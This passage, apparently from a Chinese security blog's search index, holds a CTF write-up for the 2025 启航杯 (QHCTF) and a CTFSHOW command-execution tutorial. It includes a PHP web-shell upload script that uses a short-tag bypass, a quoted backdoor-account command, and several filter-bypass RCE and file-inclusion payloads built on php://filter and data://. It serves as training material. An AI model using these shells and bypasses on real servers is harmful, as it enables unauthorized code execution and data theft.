-内存马"]},{"title":"启航杯WP","url":"/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AFWP/","content":"这次启航杯跟Demon师傅组队，Demon师傅很牛做出两个misc但是web的发力期被我截断了不然肯定嘎嘎做，但是必须批评Demon找来的两个队友水的一逼而且态度真是无语，早早组好的局竟然有个人没报名，然后一整天都在当捧哏，一个ez的伪协议绕过就直接把他卡死一早上。下午我让他去写WP payload和思路都给了结果晚上了给我说：”写不出来~“另一个选手也是极品，报名了但是好像没参与，给一号选手用账号去了。最后定榜55名，我以为是没奖但是好像是前70给奖，但是无所谓了，题的质量很一般。可惜misc还是做少了经验太少不然感觉除了第二个osint以外其他的应该是能ak的，\n取证也是奇奇怪怪的FTK配了半天挂载到本地结果还是不好使一直权限不够权限不够的，不然感觉还能多做点取证题。\n幸亏有Demon师傅帮我分担写wp的重担，而且还给我投喂奶茶和点心真是破费了。\nCryptoEasy_RSA题目是开启容器给题，基本上就是动态flag\n\n$$private_key &#x3D; b’—–BEGIN RSA PRIVATE KEY—–\\nMIICWwIBAAKBgQDaRITFDVDfEl8XwGzeiYnK+ZL9tB16amRkn+1je4M7lONcmQEV\\nL673B9YpCZ1HVtD87G7xiHmc&#x2F;wrgi8bzEVQ06YRLXThg6IoTbT6LUZPYZn8SevBN\\npc46oD8VPfMmplc0DXqg&#x2F;HJaQYj4HhSTjontsO2ohGExUndlcpQrcDwQBQIDAQAB\\nAoGANF40LMMhICRcRGqatFnzgYuXxN8uI2zbYXktj6zWs7jpRBJBvD+QjxyGOZpg\\n7fjac5SWmcTQyOY4Sd+&#x2F;gBosRYRA11O+ssWUvYva1pxAW36QYn6BApuuFOJV4iZN\\n7z5lyHdQU9AKW+qfCw5mYBqDu&#x2F;gQ6aIKIqXcc4yzOuVWfZECQQDpO7X+cDDRUKMS\\nsrT5BUCgLKeZ+EvcItAMFDPctYWx3M4TWs7rx&#x2F;4mKRLUb4M+kAeMjNRr&#x2F;uHP1WbO\\nethUI&#x2F;0HAkEA75LUucqfHxy70m6fM4TDbMd9+l&#x2F;9rHur9LNOVATyOTtP8o6cEmNw\\n7jIm1+qCdY4UUV04E6JAJCdHfs2XvZPTkwJAARmD+SgkQshjjHIFQmtQ67BqNeKi\\n0O3lFzl9KRw9&#x2F;iGxYwv5j8kInLty2EeSUdgyAOqlEcFI5Ub3Th&#x2F;sJzFoPwJAWcBA\\nQXpPMnCpTKR0r&#x2F;BE5jO2Vl4vwrZyLTIfXgqcVCSMRup2Pc1TOWlAdBM+3JtlsTWj\\nFHfsX573geGzvynqUQJAGVEl858Q0cjbagyTh5ByLxn+dR+Zsixjw7xBX1isJW2+\\n2iiEUVsixyYY3&#x2F;Yk7&#x2F;m+B&#x2F;FF5iTV5G7pNK1oQ35fAA&#x3D;&#x3D;\\n—–END RSA PRIVATE KEY—–’public_key &#x3D; b’—–BEGIN PUBLIC KEY—–\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDaRITFDVDfEl8XwGzeiYnK+ZL9\\ntB16amRkn+1je4M7lONcmQEVL673B9YpCZ1HVtD87G7xiHmc&#x2F;wrgi8bzEVQ06YRL\\nXThg6IoTbT6LUZPYZn8SevBNpc46oD8VPfMmplc0DXqg&#x2F;HJaQYj4HhSTjontsO2o\\nhGExUndlcpQrcDwQBQIDAQAB\\n—–END PUBLIC KEY—–’enmessage:WjCP8Htx9flF7S28xJz&#x2F;eiwjOJr5QwJ9ZUTLL3PqujMsAWonjLeMLfcHprEY&#x2F;lcyXOR3CShyE0HqQjEFnRrI0+cnwtFkY3OG341g6mEuwqG364vKmq95FPEi76y9ICdfuagTdAuzhzvISXkgATQ2V31nvgeln1+vuAq0hez9qEM&#x3D;private_key &#x3D; b’—–BEGIN RSA PRIVATE KEY—–\\nMIICXAIBAAKBgQDSkyfKFrEABN38FH5ZWwclPY+7z3I5qp8ckUcp0MDM9AEw9C4U\\n2TpQ6kX7o1DhxaX+lXZsvkY30VTjeFLagQLwyEvEaXkLrCkA6Vt+LRZrGh&#x2F;eoji2\\nmwZgZQAP5mcNN+zd8UfJ477WiSnyFAhP9xo4Yk&#x2F;ulBiiXbDzxJ6uENavhwIDAQAB\\nAoGAIlmyBHPrf3V2dtrVpPhF8&#x2F;ZqaONAHsBtaz4XDe8JUdsTX1Z94UBxvxBbG9+6\\nNSebr&#x2F;+BYt+D2d19NmGC9opUHaz0ngSTSAbLhJRKLfl&#x2F;i2aI1I6A&#x2F;Gj88zi8s6yF\\nsQr8jgLZMg1xYDtjXRRcMRB16fPXecikJBfUuhHocWEtyokCQQDY6o31ZF8mM2rl\\nz1QrOHs5oIAXGgWsrrPQS9dlFsp3b5xo4l7vwgZfl8bSCujfnM4v&#x2F;KJfJt&#x2F;TJu9E\\nWlTv8mupAkEA+IQZKsutRpb+zRKd+&#x2F;jKZV3xXuo+eJGT8rydp5L1xy0Aen+qKZyd\\naTl2dUFUo04&#x2F;bmxGKmsD&#x2F;VPPjskpDOy&#x2F;rwJBAI+7jGlIIwxLEdBJe3pQKMbcpUOp\\niI0ODjQ9rPJdEbfmivus1D+Gj3aUObhAZmKVosKFYoouVi2yJOVj&#x2F;dgpCFECQF2o\\nkz+QsUYIRBEPciDzO3wGcqAd0dtoqgRyV0w&#x2F;U4d0C1kfYgb6skxkzqMUMwy0wa0g\\n+zSjTkab3n5mi6UGWJsCQApqGz86U709A3G9gF34G75ePLQVwOI&#x2F;9RjtzxuIY3Rn\\nBS5ACOsQb&#x2F;kW1wal2MhCOdWKgDrl0KZpzg855Sh4Rd0&#x3D;\\n—–END RSA PRIVATE KEY—–’public_key &#x3D; b’—–BEGIN PUBLIC KEY—–\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDSkyfKFrEABN38FH5ZWwclPY+7\\nz3I5qp8ckUcp0MDM9AEw9C4U2TpQ6kX7o1DhxaX+lXZsvkY30VTjeFLagQLwyEvE\\naXkLrCkA6Vt+LRZrGh&#x2F;eoji2mwZgZQAP5mcNN+zd8UfJ477WiSnyFAhP9xo4Yk&#x2F;u\\nlBiiXbDzxJ6uENavhwIDAQAB\\n—–END PUBLIC KEY—–’enmessage:OVafA&#x2F;n9ovZx9rd+mM2lz41u4Ga1xaYJssXApL0hfKwBWTA&#x2F;XAC+OX4hVk3UWPZbs&#x2F;68oN&#x2F;C5LmzwEfyBC0N10cOIuJq78eTvMLaj6tc72PPAbt+0YUBSbIMt6m7&#x2F;kzty&#x2F;l5nbZxVt4TCPyH8Zqr4NzriqQhNwjUhrhTGT7wJBs&#x3D;$$其实我是不太会密码的然后附件给了一个py的模板\nfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import paddingfrom cryptography.hazmat.primitives import hashesimport base64# 加载私钥private_key_pem = b&quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----MIICXQIBAAKBgQC8NruXkH2ORXb249GMv+8Y3tPd8nu5OOMPUV5L16KELi9AVxoYY1v7aEnMXNkUEQ1yeLjyxQrPV3QmQA9jaTLdLf/QgyxGPDlVjjb1g9uxxLr5N0a4SLZ9uaQ5EkswTFtvQyHzbC21eowxvVNapHMfEEp5YuThrgQynxuQCcHtswIDAQABAoGAFUNKV8SV5/lBXSypSJvfBfHCgLFQuJZMfIyw46OQSMYzm11butlFaSEZLpJnXxolaUMUgy9Z2ckOUPXtZx8u2iv2t1UzJeh3cCbhGok4+Ja69JWoRQeslTk2W2TxTYuUuspQYYrna+cUNsd4MRKMoa+bDosjRy3rqlnvPb5utC0CQQDSvDxlWjvI+pFf4fylByLBSlfDDDR80tXoMWj28t43JH+mviyl8rkX7zppH4BVe9IL+0nv+myWuJ8OIcQ4SZKHAkEA5KQZxRGMd1Ax1HhFqOPzqMFcszzzp2mpOEbZyhmrCRAa5MUmPIkorwYJvYwUWT7a3AZcl/Koi7bqhfFOo43adQJAS76k5rkcLA0EG7aanKaH83nJOa41X3hYsnCwDbMV9DQGPeS1H6Cyrsup7wcHlbI/uVbFKKCWT0ZkxSuV37VyGQJBANB2UkycgG60fopTEmg3VgwyKHv/gcPNEY2PA7lBh/DebzbQDdm50I8ruSvKES+BoHhlkHy1sTiZkOCIsANtLZUCQQCk1BgGGG+sKRHS2/xu3lT3C2Ihn1hrnNLMQ5QlC0JJ/FSHxvVpzB8o94PNq6X+KrK6p82WYfkLKl+A5YPhoh/Q-----END RSA PRIVATE KEY-----&quot;&quot;&quot;# 加载私钥private_key = serialization.load_pem_private_key(private_key_pem, password=None)# 加密的消息enmessage = b&quot;PfifIriIHAwst7UxsHPNj3CGwlnNWbB5iVVq9O6oEsinLxxJgHcTmBHFGxWA5FC87aHKARXCzwH+v4H1ES/lMSnkVuVfrQdReR62GYIWUYuB2Gb6LnEJ0n4x9sXBA5FrSH9wlu14WT4S+ko+90kCS2jgGC7R2vKRe2QfFFwZ1R8=&quot;# 解密消息encrypted_message = base64.b64decode(enmessage)try:    decrypted_message = private_key.decrypt(        encrypted_message,        padding.PKCS1v15(),        # 使用适当的哈希算法​        algorithm=hashes.SHA256()​    )​    print(decrypted_message.decode())except Exception as e:​    print(f&quot;Decryption failed: &#123;e&#125;&quot;)\n\n然后去找ai，一开始是直接扔给他是不行的，但是多调教几次就好\npayload：\n# -*- coding: utf-8 -*-from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPimport base64# 加载私钥private_key = b&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----MIICXAIBAAKBgQDEfgk6+MERVwmKx6b4w4HM+cKlP34Lz7qMICOnDK906zIQyA2a7YTba8vssM4jpf+RLda0ZtAWnLj+sVgsBQAaWQ8quUt2FJCFEglpCBbvvsdfBD/AWc6w58ekPUWvcMu+Q68EVUre1lSXl8Lt2U0ObB77l577nYAdr7rf7HJMlwIDAQABAoGAAaKQLm7GIdV46DAOckt417J3AtZVv4C/AKN+fclb5xEonX3MqdldcvtL+xri3Du+tf/iUCX63UqjOhtSVytuJhuQ2QIUUrkNEPkNBye5aIPN6j4buZXHzyfyVxqy6zddT0HTGzIOEn9VIIHMydrrdvEYEd2ZrwlRQApTNAQztGECQQDOllqpJ/R/Kgb38QuJvhN1jDco9DYb9c2+XZL3u5aFZpJ2C86gus2NrK8096V7LOt02Vc0n4gBuXYv9BMbo997AkEA832M97qZ+aVi0c0okDv0wORxtDDE/zoXOjzSMS+xMoC7i27Hn/AzDL6EHfYBxqj247Tq9QxMBMumclyL/+GOlQJALfwR2i1moxe7zVz+cH663iOD873IfZjNX1585GABNViLqXMfX2+1aZ/SsDufvjdVggEPBEuufpPF1w7BYhmsGQJABGJSU3OMqi4MJXLoNBCgS4jRc0kdgurs2COYNUKCkkI3Hj+UYJDWmngjsNZpGcaZC2iKgncCN2PjT1PTQXwyMQJBAJItDvEaRC8BzlC10h31KC6gmmwU8IsqBYe4B6+btvITUXZ23kO/okQTy65x4MmP5g1XLJAj29jVeZAUW+/B2uo=-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;# 加密后的消息encrypted_message = b&#x27;&#x27;&#x27;EfXlCYvGHy4Haw0cl9dW5ufxMoB9rgturZOVoKokBg/fHOPDpiYY+jeABxMKAgjrCbtync9Gx0l0dfYSs06KTKVfR5L4oZbwolWx19bCVWzlQ9f91x1Z8U/uE9fG0xna/wUTvrExm8QdKC1OxmSFvPNrffrkEDzEVWP3lTPZ3wQ=&#x27;&#x27;&#x27;def decrypt_message(encrypted_message, private_key):    # 导入私钥    key = RSA.import_key(private_key)    # 使用PKCS1_OAEP解密    cipher = PKCS1_OAEP.new(key)    # 解码Base64格式的加密消息    decrypted_message = cipher.decrypt(base64.b64decode(encrypted_message))    return decrypted_message.decode()# 解密消息decrypted_message = decrypt_message(encrypted_message, private_key)# 输出解密后的消息print(&quot;解密后的消息:&quot;)print(decrypted_message)\n\n\nQHCTF&#123;c0cd580e-2859-469c-b58e-cec1abe77e6d&#125;\nMISC请找出拍摄地所在位置-OSINT这个题很恶心，我认为\n\n说一下我做这个题目的思路，首先就是对着图片本身去找一下主要就是看exif，但是一般这种网络迷踪肯定是不会给的，所以没有收获很正常，然后我就把目光放到那种精准定位的地方了，我想看左侧蓝色大巴后面小车棚的电话，直接去问问（哈哈真这么想的但是可惜很糊辨认不清楚）然后这些周围的商家店铺太杂乱了，地图上是很难找到的，但是我还是找了想碰碰运气。\n接下来的解题思路是锁定右上角的广告，柳城鸿鑫4s店，直接锁死柳州市，然后对着商家店铺输出，最后最容易找到的是绿源电动车上面的那个共享科技美学馆，直接就能锁定这个路口\n但是flag死活交不对，一开始我以为是我找错了\n小明在接亲戚回家过年时随手拍了一张照片，之后他在网上发起了一个挑战：找到照片中的地点并排名前三的人，将获得额外奖励。现在，挑战就在你面前，你准备好接受了吗？提交方式：QHCTF{xx省&#x2F;自治区xx市xx县&#x2F;市&#x2F;区xx路与xx路交叉口}\n看到这个提交格式你不懵逼吗？\n最后过了一个多小时我实在做不出来的时候反应过来要不然试试没有&#x2F;\n直接成功，真是无语以后建议给格式就标准一些，别老误导我们CTFer\n\nQHCTF&#123;广西壮族自治区柳州市柳城县六广路与榕泉路交叉口&#125;\nOSINT-你猜猜这是哪？这道题当时没出，后来在群里问出题人解题思路，出题人说第一个osint是静心拍摄的，第二个osint纯纯随手拍\n但是我没想到这题最后20多解，估计是被py烂了，群里的大哥说去大众点评找酒店，不能找后面的银行，银行太多了，酒店反而好找\n我是没话说了，能找到感觉也是狗运，我是没狗运了\n\n你能看懂这串未知的文字吗这题当时也没出，很早就找到羊文了但是扔到随波逐流梭哈没有成功我就很懵逼\n\n在贴吧找到羊文对照表\n\n翻译之后是\nszfpguwizgwesqzoaoerh\n\n但是放到随波逐流里面梭哈没出来，赛后大师傅在群里说是维吉尼亚\nlsb隐写\nb1,rgb,lsb,xy .. text: “qihangbeiiseasy”\n然后在用随波逐流维吉尼亚解密就完美解出\ncryptoveryeasybysheeb\n包上{}和flag就行\nPvzHE这个是植物大战僵尸的那个pvz是Demon做的，进去直接找到images\n有一个图片直接就是flag\n\n猿类的编程语言你了解吗\n用jphs这个工具，但是以前没接触过图片还有这个方向的东西，后来在我的不知道哪个老学长祖传下来的工具包里面就搜到了\n但是要密码我不知道在哪，等着官方wp下来之后在看看吧，(根本没秘密我真服了，但是我鼠标点击就报错，回车就行了)导出这个hide之后是ook解密这题比较misc有点好玩\nn\nook解密https://www.splitbrain.org/services/ook直接梭哈了\n______启动！这题是Demon解出的\n\n找到这个流量包，\ntcp追踪流\n但是Demon是找的ai直接就吐出来了具体解法没给出\nQHCTF For Year 2025这个题也是Demon出的根据hint对着日历一个个画出来就能拼出来，不知道为什么这么简单的思路qit那边竟然没人做出来\n什么时候qit能来个大爹帮我分担一下压力啊\nhint:080714212829302316092230-04111825121306132027-0605041118252627-08091009162330-0102031516170108152229-0108142229-0203041617180209162330-0108152229303124171003-231609021725181104-01020917233029\n\n\n最后拼出来是QHCTF{FUN}这个题没啥意思\nWEBPCREMagic学弟做出来之后给我说是php短标签绕过，然后他写了脚本给我\n源码：\n &lt;?phpfunction is_php($data)&#123;     return preg_match(&#x27;/&lt;\\?php.*?eval.*?\\(.*?\\).*?\\?&gt;/is&#x27;, $data);&#125;if(empty($_FILES)) &#123;    die(show_source(__FILE__));&#125;$user_dir = &#x27;data/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);$data = file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);if (is_php($data)) &#123;    echo &quot;bad request&quot;;&#125; else &#123;    if (!is_dir($user_dir)) &#123;        mkdir($user_dir, 0755, true);    &#125;    $path = $user_dir . &#x27;/&#x27; . random_int(0, 10) . &#x27;.php&#x27;;    move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $path);    header(&quot;Location: $path&quot;, true, 303);    exit;&#125;?&gt; 1\n\n学弟做出来之后给我说是php短标签绕过，然后他写了脚本给我\nimport requestsurl = &#x27;http://challenge.qihangcup.cn:33842/&#x27;file = &#123;&#x27;file&#x27;: (&#x27;1.php&#x27;, &#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;, &#x27;images/png&#x27;)&#125;res = requests.post(url, files=file, allow_redirects=False)print(f&quot;路径: &#123;url&#125;&#123;res.headers[&#x27;Location&#x27;]&#125; ,木马为：1&quot;)\n\n\n用蚁剑连接,在根目录下找到flag\n\n那么这道题对我来说肯定不是这样就得过且过了\n开始复盘：\n &lt;?phpfunction is_php($data)&#123;     return preg_match(&#x27;/&lt;\\?php.*?eval.*?\\(.*?\\).*?\\?&gt;/is&#x27;, $data);&#125;//这里是一个函数，data传参里面不允许有“/&lt;\\?php.*?eval.*?\\(.*?\\).*?\\?&gt;//”is这些东西，把&lt;?php ?&gt;标签ban了if(empty($_FILES)) &#123;    die(show_source(__FILE__));&#125;//这段代码的意思是如果$_FILES为空（即没有上传的文件），则执行die(show_source(__FILE__))，这会终止程序执行并输出当前文件的源代码。就是说让你传文件呢！$user_dir = &#x27;data/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);$data = file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);if (is_php($data)) &#123;    echo &quot;bad request&quot;;&#125; else &#123;    if (!is_dir($user_dir)) &#123;        mkdir($user_dir, 0755, true);    &#125;    $path = $user_dir . &#x27;/&#x27; . random_int(0, 10) . &#x27;.php&#x27;;    move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $path);    header(&quot;Location: $path&quot;, true, 303);    exit;&#125;?&gt; \n\n因为把很多东西都ban了 让传文件又不能用，那就用php短标签去写一个小马\nphp短标签&lt;?php ?&gt;是正和常情况下的标签，用于识别这是个php文件，但php也允许使用短标签&lt;? ?&gt;和&lt;?=  &gt;，可以用于php被过滤的情况下。 &lt;? ?&gt;等价于&lt;?php ?&gt; &lt;?= &gt;等价于&lt;?php echo ?&gt;举个例子：&lt;?=&#x27;Hello World&#x27;?&gt;    // 输出 &quot;Hello World&quot;\n\n细细品味一下学弟的payload\nimport requestsurl = &#x27;http://challenge.qihangcup.cn:33842/&#x27;file = &#123;&#x27;file&#x27;: (&#x27;1.php&#x27;, &#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;, &#x27;images/png&#x27;)&#125;/*建了一个字典，键为 “file”，值是一个元组。元组中第一个元素是字符串 &#x27;1.php&#x27;，代表一个文件名；第二个元素是字符串也就是文件内容，images/png应该是定义成png格式方便绕过吧&#x27;*/res = requests.post(url, files=file, allow_redirects=False)//剩下的就是post传参了print(f&quot;路径: &#123;url&#125;&#123;res.headers[&#x27;Location&#x27;]&#125; ,木马为：1&quot;)//回显蚁剑的连接路径\n\n\n\nEasy_include源码：\n&lt;?php error_reporting(0); //flag in flag.php $file=$_GET[&#x27;file&#x27;]; if(isset($file)) &#123;     if(!preg_match(&quot;/flag/i&quot;,$file))     &#123;         include($file);     &#125;     else     &#123;         echo(&quot;no no no ~ &quot;);     &#125; &#125; else &#123;     highlight_file(__FILE__); &#125; ?&gt; \n\n一个简单的文件包含，用data伪协议读取\n?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,\nWeb_IPForensic早上起来启航杯平台关了，等着后续平台重启我再去补上Forensic的复现\n中午就开放了服了，本来还想歇会，但是我还是拖了两天哈哈根本不想学习。\n给出附件（10G）通过网盘分享的文件：启航杯取证.7z链接: https://pan.baidu.com/s/1xZ3bY58Td-OQ6CqyrVpNAw?pwd=23ch 提取码: 23ch\n解压密码是90382728-ca22-48e7-8413-61f6438f1b90\n关于取证这个题给的是e01文件我只会用ftk进行挂载肯定还有别的方式但是好像要收费\n然后由于我把这些乱七八糟的东西基本上都放到D盘里面然后D盘权限只给了可读和可写没有给完全控制导致我一直挂载好也进去不\n今天捣鼓的时候突然想着看一眼D盘权限果然解决那就继续看看取证\n首先就是FTK挂载，FTK其实就是镜像虚拟仿真用的，FTK挂载到本地你本地就会出现挂载起来的磁盘，在此电脑中就能直接看到然后其实就能够正常访问了应该是这样\n\n这个时候可以去虚拟机里面搞去仿真，也可以直接本地做题，在这次取证好像win6很难出解，出题人说是因为win6会被杀毒软件杀掉\nWin_01某天，小明正在某网站进行学习。突然，一位蛤客盯上了他，并向他发送了一封钓鱼邮件。由于小明刚接触网络安全，对钓鱼邮件并不熟悉，他不小心下载并点击了邮件中的附件。当他后来学习到钓鱼邮件的相关知识时，已经为时晚矣。于是，他请求你帮助找出蛤客的痕迹。请你针对附件镜像进行一次应急响应，查找以下flag值。压缩包附件的解压密码为：90382728-ca22-48e7-8413-61f6438f1b90。请以QHCTF{xxxxxxxx}的格式提交结果。\n1.找出系统中蛤客的ip地址及端口，提交方式请以QHCTF{md5(127.0.0.1:80)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}\nWin_02蛤客在控制小明的系统后，创建了一个最高权限的后门账户，请你找出该账户的用户名及密码，提交方式请以QHCTF{md5(user_password)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}\n这个控制系统后的操作看C3师傅的笔记能知道一般都是在powershell的记录里面G:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\n也就是这个路径下有一个文件\nnet user HackY$ 123456 &#x2F;addnet user HackY$ &#x2F;de;net user HackY$ &#x2F;delnet user HackY$ 123456 &#x2F;addnet user HackY$ &#x2F;del\nWin_044.蛤客在系统数据库中藏了一些东西，请你找出其中的flag值提交方式：QHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\n这个题是在注册表里面找到的flag\nWin_055.小明在找你帮忙之前，喊了他的一位好友帮他先行取证，请你找出他好友远程所使用的软件，并找出控制了多少秒，ip是什么，提交方式请以QHCTF{md5(xxxx_10_127.0.0.1)}进行提交，例如：QHCTF{cef54f47984626c9efbf070c50bfad1b}\nWin_066.请你找出蛤客在启动项中藏的flag 提交方式：QHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\nWin_07蛤客在home目录中存放了一个恶意程序，请你分析该程序，并找到其中的flag值提交方式：QHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\n","tags":["-WP -CTF"]},{"title":"命令执行RCE（CTFSHOW）","url":"/2025/01/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE%EF%BC%88CTFSHOW%EF%BC%89/","content":"RCE RCE（remote code execute）：远程命令执行或者代码执行，我们平时说的rce，比如thinkPHP的rce漏洞，即算代码注入漏洞，也算rce漏洞，因为渗透的最终情况可以实现执行命令或者是代码都属于RCE，例如代码执行、文件包含、反序列化、命令执行，甚至是写文件Getshell都可以属于RCE\n关于命令执行，我的认知是web的基础功底，很多别的种类的题目例如ssti这种类型的找到flag时用到的姿势和命令执行很相像思路也是比较接近，所以我们一定由浅入深的把基础的命令执行payload理解透彻\n首先就是cat flag（别给我说这个你不会，不会自己查去其实就是个打开的命令，但是在我刚开始进行练习的时候面对的是个tac，一开始我以为是后端写的东西，必须倒叙才行，但是越感觉越不对劲，于是我就去问后来得到个差不多的理解\ntac 我的理解是从cat的文件里面倒序出每一行其实就是一种简便的命令\nisset() 函数用于检测变量是否已设置并且非 NULL&#x2F;&#x2F;其实就是保证你正常传参的\n本篇文章主要参考落寞的魚师傅的web命令执行入门\t星|焰师傅的命令执行详解(但是理论偏多)说多无益多看看题试着做几道就会很舒服了\nweb29&lt;?phperror_reporting(0); if(isset($_GET[&#x27;c&#x27;]))&#123;     $c = $_GET[&#x27;c&#x27;];     if(!preg_match(&quot;/flag/i&quot;, $c))&#123;         eval($c);     &#125;      &#125;else&#123;     highlight_file(__FILE__); &#125;\n\n传参禁止flag字段思路:用通配符*补充好flag.php,然后想办法搞到\n?c=system(&quot;cp fla* example.txt&quot;);\n积累姿势,这种情况是指的用复制命令把fla*– *号自动补充后面的内容其实就是指的flag.php\n复制了一份新的并命名为example.txt再访问即可\nweb30&lt;?phperror_reporting(0); if(isset($_GET[&#x27;c&#x27;]))&#123;     $c = $_GET[&#x27;c&#x27;];     if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;         eval($c);     &#125;      &#125;else&#123;     highlight_file(__FILE__); &#125;payload:?c=echo exec(&#x27;nl fla?????&#x27;);//nl是一个文本处理命令，主要用于为文件中的行添加行号//payload的意思我是这样翻译的:获取最后一行输出,然后这个命令是nl fla???,就是说fla??的那一行要显示行号然后显示出来内容system()passthru()//也是用于执行外部命令 passthru()函数主要用于执行一些会产生二进制输出的命令exec()//它主要是获取命令执行后的最后一行输出。它会将命令的输出放入一个数组（如果提供了第二个参数），并且返回命令的最后一行输出内容。shell_exec()//shell_exec()函数执行命令并返回命令的输出结果（作为一个字符串）。它类似于exec()函数，但返回的是完整的输出，而不是最后一行。popen()proc_open()pcntl_exec()反引号 同shell_exec() \n\n\n\n反引号在php中类似于system函数 可以执行shell命令\nweb32&lt;?phperror_reporting(0); if(isset($_GET[&#x27;c&#x27;]))&#123;     $c = $_GET[&#x27;c&#x27;];     if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123;         eval($c);     &#125;      &#125;else&#123;     highlight_file(__FILE__); &#125;payload:php://filter/read=convert.base64-encode/resource=flag.php #伪协议?c=include_$GET[cmd]?&gt;&amp;cmd=php://filter/read=convert.base64-encode/resource=flag.php?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.phpinclude函数:include是 PHP 中的文件包含函数，它的主要作用是将指定的文件内容包含到当前的 PHP 脚本中并执行。这意味着被包含文件中的 PHP 代码将在包含它的脚本的上下文中运行，就好像代码是直接写在包含它的脚本中一样。\n\n这里过滤了反斜杠斜杠分号之类的\n思路是用include函数实现不用括号的文件包含,然后再配合伪协议,分号使用&gt;?代替\n在这里我对于include_$GET这一内容不太理解去问sun师傅,孙师傅告诉我说是实现文件包含重造变量–重造了cmd这个传参然后使得传参不受限制了,**&gt;?**代替了分号\nweb33error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125; //过滤了双引号,完全可以照搬32的payload?c=include_$GET[lww]?&gt;&amp;lww=php://filter/read=convert.base64-encode/resource=flag.php?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php\n\nweb34error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;可以一样用上面的payload\n\nweb35error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;payload;?c=include%0a$_GET[cmd]?&gt;&amp;cmd=php://filter/read=convert.base64-encode/resource=flag.php?c=include$_GET[cmd]?&gt;&amp;cmd=data://text/plan,&lt;?php system(&quot;tac flag.php&quot;)?&gt;?c=include$_GET[cmd]?&gt;&amp;cmd=data://text/plan;base64;PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==#到这里有三种方法可以使用\n\n过滤了，&#x3D;号和&lt;括号这里可以使用data的base64 把要执行的命令加密了传进去\nPD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==\n\nweb36error_reporting(0); if(isset($_GET[&#x27;c&#x27;]))&#123;     $c = $_GET[&#x27;c&#x27;];     if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=|\\/|[0-9]/i&quot;, $c))&#123;         eval($c);     &#125;      &#125;else&#123;     highlight_file(__FILE__); &#125;payload;?c=include%0a$_GET[cmd]?&gt;&amp;cmd=php://filter/read=convert.base64-encode/resource=flag.php?c=include$_GET[cmd]?&gt;&amp;cmd=data://text/plan,&lt;?php system(&quot;tac flag.php&quot;)?&gt;\n\n这次是多加了0-9的传参也就是说c传参里面原来的GET[cmd]本来是任意取值的现在的参数里面不能有数字\nweb37error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;?c=php://filter/read=convert.base64-encode/resource=flag.php #这里过滤了flag不要使用这一条没用 我只是都想测一遍用下面两个?c=data://text/palin,&lt;?php system(&quot;tac f*&quot;);?&gt;?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs/Pg==\n\nweb38//flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;        include($c);        echo $flag;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;data:// 是 PHP 支持的一个数据流包装协议，允许你使用数据（在这里是 PHP 代码）作为文件。text/palin 是 data:// 协议的子类型，指定了数据的类型为纯文本。&lt;?=system(&quot;tac f*&quot;);?&gt; 是 PHP 代码，使用 